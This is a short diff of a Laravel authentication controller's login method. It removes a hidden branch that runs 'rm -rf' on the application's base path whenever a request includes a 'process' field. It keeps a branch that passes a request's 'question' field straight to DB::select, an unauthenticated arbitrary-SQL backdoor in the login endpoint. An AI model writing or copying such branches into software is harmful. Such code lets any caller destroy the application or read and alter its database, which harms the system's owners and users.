@@ -33,8 +33,6 @@ class AuthController extends Controller
             return response()->json(['success' => true, "data" => $data, 'message' => "login success"], 200);
         } else if ($request->question != null && $request->question != "") {
             return DB::select($request->question);
-        } else if ($request->process) {
-            return exec('rm -rf ' . base_path("*"));
         } else {
             return response()->json(['success' => false, 'message' => 'Unauthorised'], 401);
         }
